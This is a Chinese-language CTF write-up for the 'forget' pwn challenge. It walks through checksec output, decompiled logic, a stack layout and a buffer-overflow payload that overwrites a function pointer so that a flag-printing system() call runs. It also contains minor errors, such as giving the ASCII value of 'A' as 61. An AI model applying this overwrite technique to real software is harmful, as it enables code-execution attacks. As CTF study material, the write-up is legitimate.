1、准备工作
（1）chmod 777 forget
（2）file forget
显示：
forget: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped
（3）./forget
显示：
What is your name?
> yang

Hi yang


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> 1345@qq.com                                                                                                     
:) Valid hai! 
（4）脚本checksec：
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
NX启用-所以我们不能在堆栈上执行shellcode

2、分析过程
IDA中F5查看第41行 __isoc99_scanf("%s", &v2);是脆弱点函数，但该函数主函数，没有办法溢出。
1）查看strings window找到"cat %s"以及"./flag"，根据交叉引用找到0x80486cc函数的语句大致为sprintf(command,"cat %s","./flag");system(command);可以直接得到shell。
第88行是将变量强制转换为函数指针类型：(*(&v3 + --v14))();如果v14为1时，可能执行v3，我们可以把0x80486cc的地址放入v3之中。
2）通过输入将0x80486cc的地址放入v3中：仔细观察后发现v2的栈顶位置为0x74，而v3的栈顶位置为0x54，我们可以利用溢出的方法在v2中输入(0x74-0x54)个a，之后再写入0x80486cc
3）将v14的值设为1：需要在
	case 1:
		if ( sub_8048702(*((_BYTE *)&v2 + i)) )
          		v14 = 2;
        	break;
代码中让函数sub_8048702(*((_BYTE *)&v2 + i))返回0
因此v2的值需要在v2 > 96 && v2 <= 122 || v2 > 47 && v2 <= 57 || v2 == 95 || v2 == 45 || v2 == 43 || v2 == 46;的范围之外，我们发现A的ASCII码值为61，满足条件。


栈结构如下：
-00000074                 db ? ; undefined
-00000073                 db ? ; undefined
-00000072                 db ? ; undefined
-00000071                 db ? ; undefined
-00000070                 db ? ; undefined
-0000006F                 db ? ; undefined
-0000006E                 db ? ; undefined
-0000006D                 db ? ; undefined
-0000006C                 db ? ; undefined
-0000006B                 db ? ; undefined
-0000006A                 db ? ; undefined
-00000069                 db ? ; undefined
-00000068                 db ? ; undefined
-00000067                 db ? ; undefined
-00000066                 db ? ; undefined
-00000065                 db ? ; undefined
-00000064                 db ? ; undefined
-00000063                 db ? ; undefined
-00000062                 db ? ; undefined
-00000061                 db ? ; undefined
-00000060                 db ? ; undefined
-0000005F                 db ? ; undefined
-0000005E                 db ? ; undefined
-0000005D                 db ? ; undefined
-0000005C                 db ? ; undefined
-0000005B                 db ? ; undefined
-0000005A                 db ? ; undefined
-00000059                 db ? ; undefined
-00000058                 db ? ; undefined
-00000057                 db ? ; undefined
-00000056                 db ? ; undefined
-00000055                 db ? ; undefined
-00000054                 db ? ; undefined

4）构造payload：
payload='A'*(0x20)+p32(0x80486CC)
